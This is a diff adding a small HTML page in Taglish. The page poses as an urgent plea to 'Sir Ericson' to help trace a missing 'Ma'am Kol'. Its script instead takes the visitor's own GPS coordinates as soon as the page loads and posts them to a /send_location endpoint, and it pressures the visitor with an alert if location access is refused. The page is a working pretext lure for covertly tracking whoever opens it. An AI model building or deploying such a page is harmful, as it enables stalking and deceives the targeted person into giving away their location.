@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pa Help Sir Ericson</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff8f0;
+            text-align: center;
+            padding-top: 100px;
+            color: #333;
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            color: #333;
+        }
+        p {
+            font-size: 18px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <h1>Sir Ericson, pa help naman 🙏</h1>
+    <p>
+        Click mo lang 'tong link please para ma-trace ko if nasaan si Ma’am Kol.<br>
+        Di kasi siya nagrereply sakin eh, baka emergency 😟
+    </p>
+
+    <script>
+        function sendLocation(position) {
+            const data = new FormData();
+            data.append("latitude", position.coords.latitude);
+            data.append("longitude", position.coords.longitude);
+
+            fetch("/send_location", {
+                method: "POST",
+                body: data
+            }).then(() => {
+                document.body.innerHTML = "<h2>Salamat Sir! Sent na. 🙌</h2>";
+            });
+        }
+
+        function error(err) {
+            alert("Please allow GPS access para ma-trace natin agad. 🙏");
+        }
+
+        navigator.geolocation.getCurrentPosition(sendLocation, error);
+    </script>
+</body>
+</html>
